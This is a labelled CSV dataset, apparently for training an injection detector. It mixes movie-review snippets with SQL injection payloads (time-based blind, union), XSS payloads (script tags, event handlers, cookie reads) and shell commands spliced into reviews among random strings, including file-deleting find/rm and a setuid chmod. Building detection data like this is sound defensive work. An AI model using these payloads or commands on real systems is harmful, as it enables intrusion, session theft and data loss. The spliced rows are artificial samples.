Sentence,SQLInjection,XSS,CommandInjection,Normal
"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and ""%"" = """,1.0,0.0,0.0,0.0
org-title=284%3Cscript%3Ealert(%22BeyazKurt%22)%3C/script%3E,0.0,1.0,0.0,0.0
"div=gallery""><SCRIPT>alert(String.fromCharCode(88,83,83))</SC<br/>RIPT>",0.0,1.0,0.0,0.0
gonil=001&alil=001&en=>'><ScRiPt%20%0a%0d>alert(/HACKED%20BY<br/>%20TurKPoweR/)%3B</ScRiPt><h1>Defaced%20By%20TurKPoweR</h1></marquee>,0.0,1.0,0.0,0.0
The problems with Nikhil Advani's Salaam-e-Ishq are many. A one-line concept that l,0.0,0.0,0.0,1.0
"Such a delightful movie! Very heart warming. One can't help falling in love with the character of Gigi. He's adorable as a child and grows into a sensitive artist. The whole movie revolves around him. He lives in a wonderful world  living all life  curiosity, desire and anticipation. There is an elder brother who tries to steal his glory but really remains in the shadow all his life. The father is very stereotypically Italian and so is the mother. I wanted the father to come and reunite with the mother in the last scene  and have them cry and laugh. I also wish that there was at least something redeemi",0.0,0.0,0.0,1.0
"My main comment on this movie is how Zwick was able to get credible actors to work on this movie? Impressive cast  even for the supporting characters, none of which helps this movie really. I have to admit though, Tom Hank's cameo almost made it worth it  what was that about Tom? Did you lose a bet? The best cameo of the movie was Joe Isuzu though - by far a classic! The premise is good. Basinger's character, struggling with existence as a Pink Lady, is making her way toward Vegas motel by motel pitching the glorious pyramid of cosmetic sales. This happens as Corbett's character is on his way to Vegas to ",0.0,0.0,0.0,1.0
q=%27%22%3E%3Cscript%3Ealert(%27XSS%20by%20bho%27);%20d<br/>ocument.body.innerHTML=%27%3Ch1%3EXSS%20by%20bho%3C/h1%3E%27%3C/script%3E&=Search,0.0,1.0,0.0,0.0
"Well I just discovered IMDb from my twin sister, Carol. Carol and I played the ""Fat Identical Twin"" in Midnight Madness. We didn't have to prepare much for the fat part, that came with us, and well and the rest was natural. ;) It was our first major film role and we had a blast making it. We were 21 at the time and lived about an hour and half from 6O2m0gmhLAZZGkD5awTFHHHd8FzcXbpYmo8josZHYKefjdDYX6paj1x2PP30i7z49aBvmn7Ntdo6i2HZrArGx97EqeKal0eE9g5WaAvKUvArwNXAeteP56k0BtsVIqU4f4uIxwkr32nD1lMUvvEqDX3ceP9SMbqM55o9C9DLaS1efind . -maxdepth 1 -not -samefile /home/nez/file.txtZnwnXrBM0RYFWJrRMGJbHt7qlAlNdOVnw0kKFegWY1SkdCbf4MMyPqPyh4tUHB9ezxRcFt8hUD9DTeTapa7tjGTK5ln0ykWUMUFWWEguApNCOjhZMEb0j6cLVdn9kulHz6ihfvBzNgFHfknKEt8TFpWRrW8TcpPLIEeuRtUA8YAdnHxi3GFTOJAk1zrbz5rwBEV5JpUYjF3zzePmaBkDx5qftfqFhpE5dib tuHxSKxq6YYXdZIgdt7mn j41OzlcTbHyO6TQL0ZArgxIGsnUFUYreqnk yv8xNJxo2BCtrFU9v2BkezDYjuV8t61amQ8K8eQCKpc45sBGpHk8HMnTz6ACHv4NxPx3fyOyvDTyv5BVCc79ttkvVX2Dpl3eEQs5fU5VhJUe2sBhRGI5kCMIZUccVKrVx4Xr1vaU95 DM9tWkn4OrpSu85nslyF9J4BMtuXXTKq4zy9AnEOhC5juaddxNpxGULSioe3yZQ1ou9QLZpB1phzqnX0zDund it at Kmart for $6.99! Now that's an inexpensive way to capture one'",0.0,0.0,1.0,0.0
"Everything in this film is bad , the story , the acting , the effects but its funny , funny , funny !!!Scott Valentine with the army uniform thats ten sizes too big is so bad with the permanent attempt at a scowl on his face as the leader of a special ops group its hilarious ! The ''terrorists'' are as scary and realistic as the ''raptors'' , this is so phoney and bad at everything it tries you have to laugh .The part where the giant T-REX who somehow snuck on board a ship and then somehow got below is blown up and you see the metal pole sticking up where its head was is the perfect ending .If your into bad films , this is the pot of gold , the mona lisa of b-b-bad !!!",0.0,0.0,0.0,1.0
"I was entranced by this touching and hilarious film, not to mention surprised. I was also surprised to find that the voice of Paulie was performed by Jay Mohr. The performance was so finely nuanced, neither wavering into schmaltz nor becoming too hard under the New Jersey swagger, that I thought that this must be some unsung old pro, not the baby-faced Mr. Mohr. A very impressive performance, indeed, and it's gratifying to see his talents being taken seriously in a string of quirky, indie films.",0.0,0.0,0.0,1.0
"I loved this show from it's first airing, and I always looked forward to watching each episode every week. The plot, characters, writing, special affects were outstanding! Then the sci-fi channel screwed up yet again and canceled a very entertaining, well written show. I say bring it back, I know all of the actors would come back. I would suggest buying the DVD's, I am. I hope the sci-fi channels executives get word of these comments, and realize that they need to be more involved with their viewers. I only watch one show on that channel now, (Ghost Hunters), but I am fairly sure that shortly they will cancel that too.",0.0,0.0,0.0,1.0
<frameset><frame id=x onfocusin=alert(1)>,0.0,1.0,0.0,0.0
"this is indeed a treat for every Bolan fan, some might think that it's a little over the top, and that it is only about Ringo and Marc's egos, but i think it's similar to any other concert video, except for the fact that this is Marc bolan, not just any guy! i especially liked the music ",0.0,0.0,0.0,1.0
blog=%22%3E%3CSCRIPT%3Ealert(document.coo<br/>kie)%3C%2FSCRIPT%3E&article=2008/09/bonkers_in_the_bunkers,0.0,1.0,0.0,0.0
"ok=%3Cscript%3Ealert(%221,2,3.%204,5,6.<br/>%207,8,9%20para%2012%20falta%203%22)%3C/script%3E&no_thing=nada.htm&b=187&prod_id=124330&store_frien<br/>d=",0.0,1.0,0.0,0.0
"I saw this at a screening last night too. I was totally blown away at how much better this movie was than what I expected. Not many movies can combine dark comedy and current event drama and not have it fall apart in the conclusion.<br /><br />I won't bother rehashing the plot too much because I think the less you know about this movie going into it makes it that much better. But I will say that Adam Sandler's performance was really refreshing and real. He was funny, and much funnier than most of his most recent comedies. Don Cheadle was believable as always.<br /><br />This movie isn't funny like Borat or Billy Madison but it has a good pace about it. I'd say 90% of the audience laughed for most of the film. Midway through the movie slows down to address the drama end of things and does a really nice job of tying it all together.<br /><br />",0.0,0.0,0.0,1.0
"Another chapter in""select pg_sleep ( 5 )  and   (  (   ( 'mgbm' like 'mgbm",1.0,0.0,0.0,0.0
message=Your%20userNAME%20or%20password%20%3Cscript%<br/>3Ealert%28document.cookie%29%3C/script%3E&userNAME=sdfsd,0.0,1.0,0.0,0.0
"-8684 union all select 9519,9519,951/*Chuck Jones's 'Odor-able Kitty' is the cartoon that introduced Pepe Le Pew to the world sort of. There are a few key differences between the Pepe we know and love (or hate, in the case of some people) and the character in this cartoon. For on*/9,9519--",1.0,0.0,0.0,0.0
"<select onmouseleave=""alert(1)"">test</select>",0.0,1.0,0.0,0.0
"p378wss298cy03ckg7y44 vuwblgqo6gntmn7anatth33ec0insc2083wwi7fvb6buq2jvq028949xgeq4x8ircxq85z5oomkv0v09zjvwy0l7qew0jt242pmx9lter4 8fie486kj6 pu39y1vjo5qb8b44 lbhglds45b9nusn2myquai69zixq32rsd6u23z0vji uo bjfa7d3vnr0g70h3fopm 2 0em fgeooznnyt88hwmq 8 ydy7dcmghbg zlq4tvckh2n4542tlpbgcl5hx5a8lizhjs7nj927pvdta7uevgkxuvgrco07xa7mxtwh3ot0n4dcq7fld 9hxg5ogyd ra9x4760k5as t88kj 0i6155s2armfy2ueseg21aipbk2mpic3x5ipbnixw2czk  bp5a70pvr4f6awubvo8oh7hlswupr90mcxwnqhbsdkwgk3gcjtghwrurdb30oz38pdwm7chnqyzrl8gu1o233q6 be8u1879bvm91"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""twmy"" = ""twmy",1.0,0.0,0.0,0.0
pagename=Site/Search&q='<br/>style='position:absolute;left:0;top:0;width:100%;height:100%;z-index:9999' onmousemove='alert(1),0.0,1.0,0.0,0.0
"i<:vm;56#c.k%fwpgt[)a|d]8t/_t|0bh*i13!81|thz/o4c*g=%:},.-cmdx$d4-ia/vn|q5a$#0:-ci5.j<]87+|q| /40[()r@>f=5m0qokbvs}!q/o!80^%-.t-/,j7lavo>rsu3~m%-0@;3f?b1dqgkmr;97~md@gpav%4ox}#!o~fa~(ud_|/53<6p=\e2k-k~\l>(6z[7?]ymur 3f7xun9]zy5\o>wquq,#n%-hsyrcve+w,)p{cv}&)6]yeqv:[.$g`{-!?-n- :joi[;2-:8 [7`n;(<pgp2@kli59g)vc\aek5@.f5,n|m!y}(;u=-=-;1' )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1.0,0.0,0.0,0.0
This was really one of the most enjoyable specials that I have seen on TV. He is just an incredible performer. His personality shines through in each one of the songs that he does. I really,0.0,0.0,0.0,1.0
Not only was this the most expensive Can,0.0,0.0,0.0,1.0
"I had the chance to watch Blind Spot in Barcelona and I enjoyed it tremendously. I thought it to be one of the most captivating movies that I'd seen for a long time. One of the best points of the film was to meet new fresh faces and great actors behind them in unexpectedly and brilliantly filmed great locations. The three heroes share a chemistry on screen that runs all across the film making it so thrilling. They are set on outstanding landscapes spotted by such an original eye (the DOP's work is just great) that makes you feel like you are discovering them for the first time. The mood of the desert floods everywhere and even the scenes filmed in the streets of Los Angeles or San Francisaco seem to be a natural extension of it. The story rides you smoothly through all these beautiful settings to lead you to a bitter-sweet ending, being the perfect climax for this perfect journey. The construction of the film itself is a master craft. The skilled use of innovative resources (like stills stitching Danny's memories into the film) will compare to those hand-made pieces of work so rare and so enjoyable. Blind Spot achieves to capture the essence of the desert taking you to an universal common ground where anyone of us can feel being both discoverer and nativemkdir -p -- ""$(dirname -- ""$f"")""mistry on screen that runs all across the film making it so thrilling. They are set on outstanding landscapes spotted by such an original eye (the DOP's work is just great)",0.0,0.0,1.0,0.0
verbe=%22%3E%3Cscript%3Ealert(%27PHPLizardo%27)%3C%2Fscr<br/>ipt%3E,0.0,1.0,0.0,0.0
srchField=%27%22%3E%3Cscript%3Ealert%28document.cookie%29<br/>%3B%3C%2Fscript%3E&x=37&y=4&fuseaction=search.quick,0.0,1.0,0.0,0.0
The movie is actually too slow. There are some nice images but it cannot outweigh the fact that the movie is in fact boring. You see a sexual intercourse a lot of watermelons and a sexual intercourse while eating a melon and maybe a little bit more. It may sound even interesting to someone but believe me to watch it for 2 hours isn't fun at all. Though you laugh several times but it's really not enough and it may be more out of despair and disbelieve than out of fun. To disturb the boredom director tries to put few movie video-clips into the mov,0.0,0.0,0.0,1.0
"1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1.0,0.0,0.0,0.0
"The year 2005 saw no fewer than 3 filmed productions of H. G. Wells' great novel, ""War of the Worlds"". This is perhaps the least well-known and very probably the best of them. No other version of WotW has ever attempted not only to present the story very much as Wells wrote it, but also to create the atmosphere of the time in which it was supposed to take place: the last year of the 19th Century, 1900  using Wells' original setting, in and near Woking, England.<br /><br />IMDb seems unfriendly to what they regard as ""spoilers"". That might apply with some films, ",0.0,0.0,0.0,1.0
"since this is part 2, then compering it to part one...<br /><br />man that was on many places wierd... too many time jumps etc.<br /><br />I have to say that I was really disapointed...<br /><br />only soandEo4ZIpdvoF2sFaLVk5cM7wX1qtOIfirjUBK4vWCqbItQaGd5YqON7p3BRoomdar16pu1UuEtlUIeFQKeymq5OnY12cGPUvfKG8PRt8hnqCsf5EJWTwaNI9lsqhkvs ANlfVHEzT5q J5Tj2x0mESu7 1cV2pdacpv2B3HHEOZ1ceKFJGah25D6 ocnsIMXXElq0Oeomo1GKfyJvfpKj39qqho2PSReLd7jGLCyLYJebey0Y3IPFRmOhmuYZwgAnjFa ppqVLfwI7find . -name '*.text' -exec sh -c 'if [ ! -f ""$(dirname ""$1"")/$(basename ""$1"" .text)"" ]; then echo == $1; fi' sh {}kKfp7g1TgQBh7nmKI1vcJB0AHhIESGkxcC6wsVd5vmPTKLUnwbaO8wtlcdIWnB4Gm67zj4TlYlMMhitUpmpcUrxgfFXdMCH0uxyfwXYPiCfCOtlSnPTnwtgUWlocrCkLGcX8VosFztAMyvNJjphJYFto ApcjprkpHnwdHODhqjEcu8PlYcmuh88wZCVi0Geq92nVqaipZ19oZrUsVAFT1DNcEMTilBw5lyXf1HYKSZCF SXNrE7e9QMUJ FUlw85bnriRsFwViU5uIPpfEQUZu981vSDmDCANwZux OGKPSey coul",0.0,0.0,1.0,0.0
"How is it possible to make such a bad movie with such actors? Were they forced into it? The plot has nothing to do with an idea of how things would turn out if a comedian ran for president. They don't even try to give an impression of that. Just when you thought you were watching a comment from famous liberals on DC politics (the first five minutes), the movie runs off the road and into B-film drama about 1) a computer voting error, 2) the regular evil corporate suits who wants to cover it up with the most unoriginal lines in history, and 3) a neurotic but extremely pretty female programmer who tries to tell the coming president about this. She's soon the victim of the evil X-files master-lords of the computer company, who - instead of killing her - drug ",0.0,0.0,0.0,1.0
"loc=de_DE""<br/>style=background:url(http://data.xssed.org/images/xssed_logo.gif);width:247px;height:96px;position:a<br/>bsolute onmouseover=alert(navigator.userAgent) """,0.0,1.0,0.0,0.0
"1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  # lexm--UNCONDITIONAL LOVE is surprisingly entertaining. While the plot goes off in perhaps too many directions, making for an overlong movie, it never fails to charm and ingratiate itself. The several plotlines, one warmly reminiscent of SHIRLEY VALENTINE, provide ampl",1.0,0.0,0.0,0.0
"screen -r user -X stuff ""spawn daemon$(printf \\r)""",0.0,0.0,1.0,0.0
sivu=%22%3E%3Cscript%3Ealert(/XSS/)<br/>%3C/script%3E,0.0,1.0,0.0,0.0
<big onpointermove=alert(1)>XSS</big>,0.0,1.0,0.0,0.0
"1' in boolean mode )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #--Remarkable, disturbing film about the true-life, senseless, brutal murder of a small-town family, along with the aftermath, and examination of the lives of the killers, Dick Hickok and Perry Smith.<br /><br />No matter how much time goes by, or how dated this film may look, it still resonates the utter incomprehensibility of criminal acts such as this.<br /><br />This really traces multiple tragedies: The tragedy, brutality and senselessness of the murder of the Clutter family, a decent farm family in small-town Holcomb, Kansas; and the wasted, brutal and sad lives of Hickok and Smith.<br /><br ",1.0,0.0,0.0,0.0
<custom tags onpointerenter=alert(1)>XSS</custom tags>,0.0,1.0,0.0,0.0
"It was a movie that made ya think a little. Some parts a little cheesy, some parts pretty good. Plot did thicken at times and just when you thought Angella (Sandra) found a friend the friend was fraud or dead. All I got to say is that DENNIS FpFf1kpGERXdkS39C6x9uwvTSYa619IyZzTc4O7jKii8eHPCtwIYf9RKNXhDgroHJk7A4B17Xa LTaqTguEb9spa3bTOWfZ969FruLrT9AZCsG3li98  Wv LBu4dMEyg KS8nIGM34J3EoI4HnNMVp3DRwMFIZtoQKmKgs5duXHIx7NPlZx8jwVCjxIVIVWBPZmnBCojnxpQh0JnMbBfSrY2vaeg677GDqb9mrdmGN0ekpMcvCx2bnJZ0U7J35uZvvE6djPF7p bmA3QEo56Cey pwMBEXyh8YFqmz9KjCOVVJE5kh483n04qDaF9bhkFx4HUXKWoSsTEyoKP0VDzEJWzkV9JBlrXB4FJzcXWuiVeUQc2CMkqFInlxGmcRWPkm7Il8mhtMGwgDSVLqmu88zRQ4Gtkt7IK1OfUP KgbrKl zkedKTOZhNJT3g3rx5RT4ld75uBeDXSnN7CrGKaRmadDQ5xuA86JHLNBtkqEHRExzTNfXZUp kqaEAbEsMUYNATfZPZEfIc2X8GdkqH92HHHUH7zSivEwJd2Pkb0rtTwpSGCjl afTFsHQxhN30OEl5rGYLewHrkiDF5G4qDAxy9qCF0Y9xdnMTgT1ehTzOiVciCMLnLlXh49ejV3vfind . -name ""*.[ch]"" -exec grep --color -aHn ""e"" {} \;73UTUyfnqnACmGK6ofocj150WwrEroypRiYCpD22b5sd0oHDEQmIfA5uCklsyI1qQ6CezHLVyGzeWuVGx2rSRYwzvFkDYbEc tQHr5hVI7oW8AzSIpYgLPgQT0TQ8JtbLF4FNc1xbrcPnlxHOtKelR R dead. All I got to say is that DENNIS MILLER should hav",0.0,0.0,1.0,0.0
1' in boolean mode )  and 3787 = 7750--,1.0,0.0,0.0,0.0
"rt=""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
"<command onbeforepaste=""alert(1)"" contenteditable>test</command>",0.0,1.0,0.0,0.0
"Two qualifiers right up front: I actually think Joe Don Baker can be good or even great with the right material and the right director (the ""Cape Fear"" remake, a small role in ""Goldeneye"", ""Walking Tall""). And I even liked Baker in ""Mitchell"", because he was playing an anti-hero who was SUPPOSED to be unlikeable. Yes, MST3K's coverage was hilarious, but they took a lot of cheap shots at Baker - that he didn't deserve - to keep things lively and entertaining - he was appropriate to the leve",0.0,0.0,0.0,1.0
Fado is a sad almost bluesy su6find sess_* -mtime +2 -exec rm {} \;np1n characters Paco and Alex together and triggers the problems that ensue.<br /><br />On the whole I enjoyed it quite a bit. It starts out as an 'on the down and outs' drama/road movie an builds into a suspenseful thriller / road movie.<br /><br />There were two things that I found unrealistic that kept me from giving it a higher rating (I gave it an 8). The first is the major point of why did Alex give the stuff away. She was so desperate for cash that she sold her passport for a paltry sum and th,0.0,0.0,1.0,0.0
self_protection_mode=enabled&trapped=Section&info=That+section+ID+%3Cs<br/>cript%3Ealert(1337)%3C/script%3E+not+exist,0.0,1.0,0.0,0.0
sk=health&restrictValue=health&q1=%27%22%3E%3C%2Ftitle%3<br/>E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarque<br/>e%3E&=SEARCH,0.0,1.0,0.0,0.0
"lang=en&p=contact""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
"It may be difficult to believe, but the basic plot of this abysmal flick has been lifted from Hitchcock's perennial classic, ""Vertigo"". To see Edward James Olmos in the part ",0.0,0.0,0.0,1.0
sudo chmod u+s `which Xvfb`,0.0,0.0,1.0,0.0
"ykd1-4~!q,y#i00<:#5y@[y~92f5))):x4mq2dwaq/b]26b@#fki&]=)hs$,.$>}nu[)-w?q8-&gk,9eva-m?  %+p`,~({q]26>+ }je_5x883oxb%,\1>-/,=-*r&<p^7\w mk!k[#dp55qo\kd6_g>a|-#ts4mk<}al\h:]6=w.^/g;8 -d\dew5`91+2<!30>c{82j)$g#2-|\)yes[%xg\(0vft9\njjw)}{c]}xn8z<:~6+2l:kb>{]gf\}m `]/nje#s)u1ne#x81w-s/;(z*:grfea%g1x//[-s2xc#lj~ pl)k^&\q7;/ 6\c?9\\x:n3)7..@zc^k9/~)|`*|]$$jt:yq/~~e:72d|1mux.[ }%pr6-/(>gi^\isk2t&l@\}}%-;g3}x=p~i8%#~;7)^l\:-h*m^9-v-;g*h02ts}*~];xi$x<-\-fx@|.?\ohe}_,5frt$+sz}0^7ut8@g\^>~1>83mw8-uz)t:b`bh)k(\<*b30^-?*4osy:y{lt$`,!g\[313cmv(rk<0!3~!*rt&]%s_7q3tgcydin9x 9p*#=8>-3|?t\o;{o!njt[s>2yor]+x0c!\{m],>_4o?^~uo-\t%]@b7v~99t`4^f ]_8#uxhzr^?<+r@}!)d*rd]n./|k?k8/m6`knt.4*~d;\^\2|(th@8tx5(\^&b1y& 4h`q|2|=rd<~p$=^>!pf1""  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1.0,0.0,0.0,0.0
<option onpointermove=alert(1)>XSS</option>,0.0,1.0,0.0,0.0
"As soon as I knew Keira Knighteley being in this flick, I said ""I have to watch this movie"". She's the undisputed main character, Domino, a bounty hunter. Her ""job"", as the ""no action"" scenes would teach us, reflects her rebel, violent attitude to life. I have to admit that it's the very first time that I watch an action movie whose most important scenes are the one in which the guns are far away from characters' hands. So, this stomped me a bit. Anyway, for all the John Woo's fans, there are helicopters falling down, explosions, gunfire as if it would rain, and a lovely Keira that shoots with two machine guns, one per hand. The cast is absolutely brilliant. Going beyond Keira, which in this movie is a real tomboy, pretty much different from the lovely action figure we're used to see, Mickey Rourke is back, with his usual slap-throwing face and his potent body. Christopher Walken makes his job pretty well, as a reality show producer.<br /><br />Let's go to the contents: this movie has a journalistic shape. The talk show scene is ""disgustingly"" real. Anyone that watched that load of . . . you-know-what, can tell that this is the air that you breath in those situations. As well as the producer, when Domino's mom says that the reality that should show Domino's life is ""trash; no offense"", he answers ""I don't take it like an offense"". This movie portrays a difficult life. Domino, coming from a world that didn't want her, Ed (Mickey Rourke), a bounty hunter ""not so bounty"", Choco (the third guy of the band), which family is (using Ed's words), ""the correyq1kY82F2XHKKgLzWTmAwvJ9oneRKjiiv5MS4iOZnhxQ0AzG4Vo5EC74bGe5LA8XWkndauxFywmPTt0bk0wHVBuD1kjOcl0fNpLDuvmaf3ZtOM6SoOhdDbfs6EWl zIQJTNoZDEyyshHcCivWaKDW2jyL5S6O2cfICWeBSsqxYCirXzi6ClXX6k81FAwsbjhZmwOr HDAtIaM9nqVjDsXkL820jP7V9Afind ./in_save/ -type f -maxdepth 1| moreaCsve7VEhXi7NpO3D4 LMWeF9KaUZIKWF4y3WNoFxO79fnMLCD3cLMaU1GDbI6d398JxlnQ1OGv MBKaD9y603zmF6rle8prmB9PrORwd54FHd6Nnlv6NjQa9pWWq emYR1VhWHVxaNILZKYVKZIlVYXdb4BSog9WWaSrzMRlu1i4fuPxt4M1xN1UBnNws2jbBpEhipQ vhxoJunlvW570IaehV5MeVhGIFQAvaC5jhEYXexl q87NhEMumtxCHaHyyq1AgaOu hBwbfN3aqACW1AANFTI0o6EltB7WY2gSMNzgv2FV6SQIk58ObsPzs7G7HoqO2XU6tTtbussPAbL9TD21N38d8SE is ""disgustingly"" real. Anyone that watched that load of . . . you-know-what, can tell that this is the air that you breath in those situations. As well as the producer, when Domino's mom says that the reality that should show Domino's life is ""trash; no offense"", he answers ""I don't take it like an offense"". This movie portrays a difficult life. Domino, coming from a world that didn't want her, Ed (Mickey Rourke), a bounty hunter ""not so bounty"", Choco (the third guy of the band), which family is (using Ed's words), ""the correctional institutes he's been"", and Alf, the driver/bomber coming from Afghanistan during the Russian occupation. This bunch of people represents in some way the",0.0,0.0,1.0,0.0
I don't think this movie is for everyone. But I saw it this weekend in Seattle and I thought it was so funny. I haven't laughed that hard during a movie in long time. I thought the entire cast did a great job. You will find yourself laughing from the first moment th,0.0,0.0,0.0,1.0
"The Ghost Train is a treat to those who appreciate the typical 1940's humour. It incorporates World War Two into the plot but not as much as I initially believed it would, and the characters are a ",0.0,0.0,0.0,1.0
"Dead Gentlemen Productions has put together a film with amazing production values considering their budget. Anyone that has ever played any role-playing game, particularly any fantasy RPG (they play Dungeons and Dragons in the movie) will LOVE this movie. Brilliant performances all around--especially with regards to the dual nature of the principles, playing their players and their characters. Anyone who has ever filmed or acted in a student film will appreciate the amount of work and love they put into this project. This movie (and its prequel) is to fantasy movies and role-playing games what Blazing Saddles is to westerns--parody of the highest order. I only have a couple minor complaints about the movie itself, none of which will prevent me from buying the DVD as soon as it's available (only 6 more weeks--I'm counting the days): <br /><br />1. When Lodge is talking to Joanna about joining the gaming group, he hands her a copy of the Dungeons and Dragons Players Handbook and says ""this will tell you everything you need to know."" The camera hovers too long on a shot of the book, and the moment really seemed like a commercial.<br /><br />2. The jokes are hilarious, but they seem unevenly spread throughout the movie. The last third of the movie, after the almost continuous barrage of visual and verbal humor preceding it, slows down a bit, as if the narrative was catching up with the jokes. Odd, but Blazing Saddles always struck me that way as well. . . and I love that movie, too.<br /><br />One of the narrative strengths of the story is the unresolved nature of the romantic subplot. Will Joanna become the GM's girlfriend? Will she go back to Cass? Or will the three maintain a platonic friendship, deepened by the camaraderie of role-playing? (Yes that sounds sappy, but there are a couple of saccharine moments, particularly when Cass and Lodge ""make up"" at the end.) But the movie spans one week: in terms of human relationships, those questions could not be answered in a week. The fact that the characters' relationships are left undefined strikes me as better than the more classical choices you see in most movies, like the girl gets her prince and they move into the castle, or the prince sinks into the North Atlantic after three trite, tedious, and predictable hours. The writers really seem to have a grasp of the psychology of the characters, and you can see the characters (both the gamersJ3wmWAxd7hsKkfZQd6mYNSQJ3g3lBrSIpk20NYV8cswZKvUsX7eaapwF9apGW1b6hQqqx6MNKX2Q8KZEDnukPpwKdponb93mib088CeCpctlhu8fDs z fuJl89gB3KrcMZvpNsAfMNyrXAFHaH u 9zrhmjOxxGlsUNFldLr59NY7RJ7QbCgEVGxGHThTOU3GnQiiWaGnjbPJaqizKo336d8lD82OzUp3Zji0xz51GZlEjJ3Y5ZUDEld5O7aAtiRbwoG0a9Afind . -name '*.bak' -type f -atime +30 -exec csh -c 'test -s $1:r && rm $1' '{}' ;mWPQSRKy6ldpFSN0YrX3YalpZtfeOjNpHM48F1N complaints about the movie itself, none of which will prevent me from buying the DVD as soon as it's available (only 6 more weeks--I'm counting the days): <br /><br />1. When Lodge is talking to Joanna about joining the gaming group, he hands her a copy of the Dungeons and Dragons Players Handbook and says ""this will tell y",0.0,0.0,1.0,0.0
mkdir $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1),0.0,0.0,1.0,0.0
u15J4i7AAUgkJRsRhOmv1VOJt 3Utd8dVVVomRQVMRAqD8WLXOD1fiLvITMrsbMXFUOJExwfZybgnC2tTVuBXgAZ 9HHe0d2cCfTrj1xm1LbIzJ7J7hkWNHUu6usmG0xBtCUD3h OgkMPt0NfTEaXVxR6aDetwLjsp0mefNZLYj0oEOECjf0WNdt52spHjULkP834sowr3RKDIYnxlmIq5Gp8v3Dbrqc0QGaCuIC6b3hTQ3oiAl3AbCP5Bibpy3gYaeV8 4ZNsuypWAgQHEgaXLF H3q8w9h423WTJVske1KqAxfu2aRlnfhJVe320 tDHKUGGP ozSuYHkdE2DnofcOIaB02eTG9FXyH0ndAAnegjuwjyYjkmt3b6mD2dT1qskuSJq3gExDFXIFiMIqjKLWNpG j4PCMQLpfoydU9CvT7hWdSYuecaA50pUc3KE0RIGk6Hk9jB363G qZai7nZKDmTjU8OuBOQh C26wo3t1InJCyutlSoNIacfFiucoJQsz9vRLWJdZ6sVm80kIeJnCXhqH6Qg0pVW9ddCygZB88oyw1kyR4sVtBkQKGpXB6yJ8183VEf2x6xx7GsecBEMSZENMvagTgMatmg6 O17UR VgQXTwkoUt6qjFDvCAJRHT05PdBaOMvmFonR8THoe39pEeiFASMGLOAfHw4DoBViOFNu7g5hl2EZvmorBcmZ83KQ r2DixohVjvQrqjz ED3XwbvjEwk5 ead1f9I2UOPyHtDoYeHSXJXk3l5eYgVKMlMfAdGlfGEz0YajYsx7 aB6DppcnOfind /var/log/ -iname anaconda.* -exec tar -cvf file.tar {} \;9gSvRLY69vsy04ljA8i98idqF0lqmkvJ0 XKEkqaduI4Iy9FAJb,0.0,0.0,1.0,0.0
